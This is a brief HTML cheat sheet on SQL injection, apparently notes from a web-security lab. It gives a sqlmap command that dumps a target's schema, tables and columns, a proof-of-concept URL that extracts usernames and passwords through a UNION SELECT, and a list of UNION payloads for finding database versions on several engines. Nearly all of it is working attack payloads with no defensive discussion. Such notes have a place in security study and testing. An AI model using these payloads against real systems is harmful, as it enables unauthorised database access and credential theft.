<h1>SQL Injection</h1>

<h2>Reflected SQL Injection:</h2>
<code>sqlmap --url https://$domain/filter?category=Lifestyle --dump --schema --tables --columns</code>

<p>Database: public</p>
<p>Table: users</p>

<h4>POC</h4>
<code>https://$domain/filter?category=Lifestyle'+UNION+SELECT+username,+password+FROM+users--</code>

<h5>Version</h5>
<p>First detect numbers of columns</p>
<code>' UNION SELECT NULL,@@version</code>
<code>' UNION SELECT NULL,NULL,* FROM v$version</code>
<code>' UNION SELECT banner FROM v$version</code>
<code>' UNION SELECT version FROM v$instance</code>
<code>' UNION SELECT version()</code>
